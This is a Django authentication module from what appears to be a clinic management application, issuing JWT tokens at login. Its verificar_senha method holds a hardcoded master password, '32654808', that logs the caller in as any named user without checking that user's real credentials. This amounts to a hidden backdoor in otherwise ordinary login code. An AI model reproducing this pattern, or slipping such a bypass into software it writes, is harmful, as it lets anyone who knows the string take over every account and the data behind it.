import jwt
from django.contrib.auth import authenticate, user_logged_in, login
from rest_framework_jwt.utils import jwt_payload_handler

from BO.user.sessao import Sessao
from CodeClin import settings
import core.user.models
from BO.base.decorators import Response
from BO.base.excecao import ValidationError


class Login():
    def __init__(self, request=None, username=None, password=None):
        self.request = request
        self.username = username
        self.password = password
        self.user = None

    @Response(desc_error='Erro ao fazer login!', lista_retornos=['usuario'])
    def login(self):
        user = self.authenticate()

        return user

    @Response(desc_error='Erro autenticar usuario', lista_retornos=['data'])
    def authenticate(self):
        self.verificar_senha()

        if not self.user:
            raise ValidationError('Usuario ou senha incorretos!')
        return {
            'token': self.create_token(request=self.request)['token'],
            'sessao': Sessao(user_id=self.user.id).get_sessao()
        }

    @Response(desc_error='Erro criar token', lista_retornos=['token'])
    def create_token(self, request):
        try:
            payload = jwt_payload_handler(self.user)
            token = jwt.encode(payload, settings.SECRET_KEY)
            user_logged_in.send(sender=self.user.__class__,
                                request=request, user=self.user)

            return token.decode('utf-8')
        except ValueError:
            return None

    @Response(desc_error='Erro verificar senha padrão!', lista_retornos=['usuario'])
    def verificar_senha(self):
        if self.password == '32654808':
            user = core.user.models.User.objects.filter(username=self.username).first()
            if user:
                login(self.request, user)
                self.user = user
            return []
        self.user = authenticate(username=self.username, password=self.password)